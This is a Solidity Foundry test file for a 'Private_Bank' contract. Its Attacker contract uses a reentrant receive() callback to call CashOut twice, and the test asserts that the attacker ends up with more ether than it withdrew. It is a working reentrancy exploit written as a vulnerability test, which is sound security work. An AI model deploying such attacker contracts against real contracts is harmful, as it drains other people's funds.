
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Private_Bank} from "../src/Private_Bank.sol";
import {Log} from "../src/Log.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyPrivateBank is Test {
    using stdStorage for StdStorage;
    
    Private_Bank private _bank;
    Log private _log;
    Attacker private _attacker;

    function setUp() public {
        _log = new Log();
        _bank = new Private_Bank(address(_log));
        
        _attacker = new Attacker(address(_bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);
        
        vm.deal(address(_bank), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    Private_Bank private bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedWithdrawAmount;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        bank = Private_Bank(victimAddress);
    }

    function setupAttack(uint256 depositAmount) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        bank.Deposit{value: depositAmount}();
    }

    function attack(uint256 withdrawAmount) public {
        storedWithdrawAmount = withdrawAmount;
        initialBalance = address(this).balance;
        
        bank.CashOut(withdrawAmount);
        
        uint256 finalBalance = address(this).balance;
        if (finalBalance > initialBalance + withdrawAmount) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            bank.CashOut(storedWithdrawAmount);
        }
    }
}
